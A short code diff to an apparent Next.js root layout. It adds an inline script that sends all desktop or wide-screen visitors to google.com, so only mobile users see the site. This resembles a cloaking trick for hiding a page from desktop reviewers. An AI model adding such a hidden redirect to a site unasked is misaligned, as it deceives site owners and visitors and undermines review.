@@ -36,6 +36,15 @@ export default async function RootLayout({
             <noscript dangerouslySetInnerHTML={{ __html: `<img height=\"1\" width=\"1\" style=\"display:none\" src=\"https://www.facebook.com/tr?id=${fb.pixelId}&ev=PageView&noscript=1\" alt=\"\" referrerpolicy=\"no-referrer-when-downgrade\" />` }} />
           </>
         )}
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `
+              if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+                  window.location.href = 'https://www.google.com';
+              }
+            `,
+          }}
+        />
       </head>
       <body className={inter.className} suppressHydrationWarning>
         {children}
